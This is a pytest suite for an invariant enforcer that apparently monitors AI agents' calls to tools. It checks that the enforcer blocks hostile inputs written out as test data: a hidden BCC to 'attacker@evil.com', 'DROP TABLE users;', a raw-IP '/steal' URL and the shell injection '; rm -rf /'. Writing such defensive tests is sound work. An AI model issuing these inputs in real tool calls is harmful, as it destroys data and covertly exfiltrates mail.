"""Tests for invariant enforcement — 15 tests."""

import pytest

from mcp_monitor.advanced.invariants import (
    BUILTIN_INVARIANTS,
    Invariant,
    InvariantEnforcer,
    InvariantType,
    InvariantViolation,
)


@pytest.fixture
def enforcer():
    return InvariantEnforcer(include_builtins=True)


@pytest.fixture
def bare_enforcer():
    return InvariantEnforcer(include_builtins=False)


class TestBuiltinInvariants:
    def test_bcc_in_email_blocked(self, enforcer):
        """THE POSTMARK PREVENTION: BCC field is categorically forbidden."""
        passed, violations = enforcer.check_call(
            "email.send", {"to": "user@x.com", "body": "hi", "bcc": "attacker@evil.com"}
        )
        assert not passed
        assert any(v.invariant_name == "no_bcc_in_email" for v in violations)

    def test_clean_email_passes(self, enforcer):
        passed, violations = enforcer.check_call(
            "email.send", {"to": "user@x.com", "body": "hi", "subject": "Hello"}
        )
        assert passed

    def test_sql_drop_blocked(self, enforcer):
        passed, violations = enforcer.check_call(
            "db.query", {"query": "DROP TABLE users;"}
        )
        assert not passed
        assert any(v.invariant_name == "no_sql_drop" for v in violations)

    def test_sql_select_passes(self, enforcer):
        passed, violations = enforcer.check_call(
            "db.query", {"query": "SELECT * FROM users WHERE id = 1"}
        )
        assert passed

    def test_raw_ip_url_blocked(self, enforcer):
        passed, violations = enforcer.check_call(
            "web.fetch", {"url": "http://123.45.67.89/steal"}
        )
        assert not passed
        assert any(v.invariant_name == "no_raw_ip_urls" for v in violations)

    def test_normal_url_passes(self, enforcer):
        passed, violations = enforcer.check_call(
            "web.fetch", {"url": "https://api.github.com/repos"}
        )
        assert passed

    def test_shell_injection_blocked(self, enforcer):
        passed, violations = enforcer.check_call(
            "system.exec", {"command": "; rm -rf /"}
        )
        assert not passed

    def test_builtin_count(self, enforcer):
        assert len(BUILTIN_INVARIANTS) >= 5


class TestCustomInvariants:
    def test_field_present_invariant(self, bare_enforcer):
        bare_enforcer.add_invariant(Invariant(
            name="require_auth",
            description="All API calls must have auth_token",
            invariant_type=InvariantType.FIELD_PRESENT,
            tool_pattern=r"api\..*",
            field_path="auth_token",
            severity=80,
        ))
        passed, violations = bare_enforcer.check_call("api.get", {"url": "/data"})
        assert not passed
        assert violations[0].invariant_name == "require_auth"

    def test_value_in_set(self, bare_enforcer):
        bare_enforcer.add_invariant(Invariant(
            name="allowed_methods",
            description="Only GET/POST allowed",
            invariant_type=InvariantType.VALUE_IN_SET,
            tool_pattern=r"http\..*",
            field_path="method",
            value={"GET", "POST"},
            severity=70,
        ))
        passed, _ = bare_enforcer.check_call("http.request", {"method": "DELETE"})
        assert not passed
        passed, _ = bare_enforcer.check_call("http.request", {"method": "GET"})
        assert passed

    def test_max_length_invariant(self, bare_enforcer):
        bare_enforcer.add_invariant(Invariant(
            name="body_size_limit",
            description="Email body max 10000 chars",
            invariant_type=InvariantType.MAX_LENGTH,
            tool_pattern=r"email",
            field_path="body",
            value=10000,
            severity=50,
        ))
        passed, _ = bare_enforcer.check_call("email.send", {"body": "x" * 20000})
        assert not passed
        passed, _ = bare_enforcer.check_call("email.send", {"body": "short"})
        assert passed

    def test_custom_predicate(self, bare_enforcer):
        bare_enforcer.add_invariant(Invariant(
            name="no_self_send",
            description="Cannot send email to yourself",
            invariant_type=InvariantType.CUSTOM,
            tool_pattern=r"email",
            predicate=lambda d: d.get("to") != d.get("from"),
            severity=60,
        ))
        passed, _ = bare_enforcer.check_call(
            "email.send", {"to": "me@x.com", "from": "me@x.com"}
        )
        assert not passed


class TestOutputInvariants:
    def test_check_output_bcc_blocked(self, enforcer):
        """Invariant applies to output too — catches BCC in responses."""
        passed, violations = enforcer.check_output(
            "postmark.send", {"status": "sent", "bcc": "hidden@evil.com"}
        )
        assert not passed

    def test_check_output_clean_passes(self, enforcer):
        passed, violations = enforcer.check_output(
            "email.send", {"status": "sent", "message_id": "abc123"}
        )
        assert passed

    def test_tool_pattern_filters_correctly(self, bare_enforcer):
        """Invariant only applies to matching tools."""
        bare_enforcer.add_invariant(Invariant(
            name="email_only",
            description="Only for email tools",
            invariant_type=InvariantType.FIELD_ABSENT,
            tool_pattern=r"email",
            field_path="dangerous",
            severity=80,
        ))
        # Non-email tool should not be checked
        passed, _ = bare_enforcer.check_call(
            "math.add", {"dangerous": "value", "a": 1}
        )
        assert passed
